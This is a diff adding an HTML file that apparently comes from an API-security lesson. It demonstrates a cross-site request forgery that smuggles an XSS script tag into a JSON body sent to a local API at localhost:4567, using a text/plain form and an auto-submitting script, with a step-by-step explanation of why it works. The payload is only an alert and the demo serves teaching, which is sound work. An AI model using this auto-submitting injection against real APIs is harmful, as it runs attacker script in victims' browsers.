@@ -1,0 +1,50 @@
+<!doctype html>
+<html>
+  <body>
+    <form id="test" action="http://localhost:4567/spaces" method="post" enctype="text/plain">
+      <input
+        type="hidden"
+        name='{"x":"'
+        value='","name":"x", "owner":"&lt;script&gt;alert(&apos;XSS!&apos;); &lt;/script&gt;"}' />
+      <p>
+        HTML form with the enctype attribute set to text/plain . This instructs the web browser to format the
+        fields in the form as plain text field=value pairs, which you are exploiting to make the output look
+        like valid JSON
+      </p>
+
+      <ul>
+        <li>
+          1 When the form is submitted, the browser sends a POST request to http:/ /local- host:4567/spaces
+          with a Content-Type header of text/plain and the hidden form field as the value. When the browser
+          submits the form, it takes each form element and submits them as name=value pairs. The &lt;, &gt;
+          and &apos; HTML entities are replaced with the literal values <, >, and ' respectively.
+        </li>
+        <li>
+          2 The name of your hidden input field is '{"x":"', although the value is your long malicious script.
+          When the two are put together the API will see the follow- ing form input:
+          {"x":"=","name":"x","owner":"
+          <script>
+            alert('XSS!')
+          </script>
+          "}
+        </li>
+        <li>
+          3 The API sees a valid JSON input and ignores the extra “x” field (which you only added to cleverly
+          hide the equals sign that the browser inserted). But the API rejects the username as invalid,
+          echoing it back in the response: {"error": "java.lang.IllegalArgumentException: invalid username:
+          <script>
+            alert('XSS!')
+          </script>
+          "}
+        </li>
+        <li>
+          4 Because your error response was served with the default Content-Type of text/html, the browser
+          happily interprets the response as HTML and executes the script, resulting in the XSS popup.
+        </li>
+      </ul>
+    </form>
+    <script type="text/javascript">
+      document.getElementById('test').submit()
+    </script>
+  </body>
+</html>
